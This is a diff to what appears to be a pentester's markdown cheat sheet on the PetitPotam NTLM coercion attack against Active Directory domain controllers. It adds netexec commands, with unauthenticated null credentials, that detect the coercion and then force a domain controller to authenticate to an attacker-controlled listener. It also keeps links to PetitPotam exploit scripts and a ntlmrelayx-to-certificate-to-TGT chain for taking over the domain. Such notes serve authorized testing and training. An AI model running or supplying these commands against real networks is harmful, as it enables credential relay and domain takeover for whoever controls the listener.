@@ -15,11 +15,17 @@ tags:
 |EPA / Channel Binding Off|❌ No|✅ Yes|
 ## Identify
 ---
-  
+```bash
+nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
+```
+shorthand
+```bash
+nxc smb <ip> -u '' -p '' -M coerce_plus -o M=pe
+```
+
 ## Exploit
 ---
 [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
-
 [https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)  
 ## Start ntlmrelayx
 ---
@@ -30,6 +36,11 @@ At the same time try to coerce DC to auth
 ```PowerShell
 python3 PetitPotam.py <attackerIP> <DCIP>
 ```
+OR coerce with nxc
+```bash
+nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> M=pe
+```
+
 You should receive a base64 encoded certificate in ntlmrelayx output
 Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.
 ```PowerShell
